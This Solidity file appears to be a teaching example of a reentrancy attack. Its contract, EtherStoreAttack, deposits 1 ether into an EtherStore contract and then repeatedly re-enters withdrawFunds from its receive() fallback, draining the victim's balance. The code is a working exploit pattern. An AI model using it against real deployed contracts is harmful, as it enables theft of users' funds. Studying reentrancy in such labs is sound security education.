//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./EtherStore.sol";
import "hardhat/console.sol";

contract EtherStoreAttack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
    // attack to the nearest ether
    require(msg.value >= 1 ether,"value");      
    // send eth to the depositFunds() function
    etherStore.depositFunds{value:1 ether}();

    // start the magic
    etherStore.withdrawFunds(1 ether);
  }

  // fallback function - where the magic happens
  // fallback()  external payable{
  receive()  external payable{
      console.log("fallback/receive function");
      console.log("balance:",address(etherStore).balance / 1e18);

      etherStore.withdrawFunds(1 ether);
  }
}
